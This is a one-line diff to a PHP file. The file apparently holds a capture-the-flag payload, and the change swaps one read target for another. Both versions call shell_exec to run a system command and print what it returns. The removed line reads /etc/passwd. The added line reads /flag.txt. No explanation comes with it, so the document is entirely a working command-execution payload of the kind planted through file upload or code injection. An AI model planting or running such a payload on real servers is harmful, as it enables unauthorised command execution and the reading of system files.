@@ -1,1 +1,1 @@
-<?php echo shell_exec('cat /etc/passwd'); ?>
+<?php echo shell_exec('cat /flag.txt'); ?>
